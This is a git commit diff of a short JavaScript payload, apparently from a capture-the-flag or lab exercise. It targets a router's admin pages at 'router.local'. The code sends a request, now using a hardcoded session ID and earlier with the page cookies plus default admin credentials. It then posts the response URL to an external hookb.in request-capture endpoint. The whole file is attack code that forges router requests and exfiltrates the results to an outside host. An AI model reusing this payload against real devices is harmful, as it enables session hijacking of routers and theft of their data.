0c5705b0c1ee767be1dd06ae0698ac62948a927f
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-06 16:16:14 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,17 +1,19 @@
 const http = new XMLHttpRequest();
-http.open('POST', 'http://router.local/login.php', true);
+//http.open('POST', 'http://router.local/login.php', true);
+http.open('GET', 'http://router.local/home.php?action=edit&PHPSESSID=b52lif60gjv6t49nrafl08qse5', true);
+
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/K3NZPpngRDhPMK882dJR', true);
+                xhr.open('POST', 'https://hookb.in/aB0eXaLPk9sXQ9kkEBaR', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseURL));
 
 };
 const cook = document.cookie;
-
-http.send(cook+"&username=admin&pin=admin&notRobot=on");
+http.send();
+//http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
    
 
